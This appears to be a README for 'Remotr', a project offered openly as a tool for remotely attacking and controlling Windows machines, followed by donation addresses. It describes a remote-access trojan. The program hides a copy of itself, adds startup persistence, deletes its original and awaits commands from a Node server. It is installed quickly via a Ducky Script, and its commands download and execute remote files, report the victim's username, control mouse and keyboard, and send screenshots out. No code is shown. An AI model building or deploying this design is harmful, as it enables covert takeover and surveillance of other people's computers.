# Remotr
A tool for remotely attacking and controlling windows machines


## Main Concept:
1. On start (if not already in the hidden folder) the program copys itself to a hidden folder, makes a link to itself in the startup folder, runs the copied version, then self deletes
2. Constantly tries to connect to a node server for instructions

## Ducky Script
 * Ducky Script to quickly install the program included

## Built in commands and features
 * Download something from the internet eg. {download: "https://fosse.co/dl/mvm.exe"} (a simple ahk script that just moves the mouse 20px and then exits)
 * Run something (like that thing you downloaded from the internet, or anything else) eg. {execute: "mvm.exe"}
 * Send username to the node server for tracking
 * Mouse Control (left/right/mouseup/mousedown/move to coords)
 * Keyboard Control with some special keys included (arrow keys/ctrl/alt/del/backspace/tab/etc)
 * Send a screenshot to the server (as a PNG, base64 encoded)
 * Self Delete (for when things go wrong)




## Donate
  * If you like the project and would like to donate I have a paypal at matt.cfosse@gmail.com
  * BTC Address: 17hDC2X7a1SWjsqBJRt9mJb9fJjqLCwgzG
  * ETH Address: 0xFdcA914e1213af24fD20fB6855E89141DF8caF96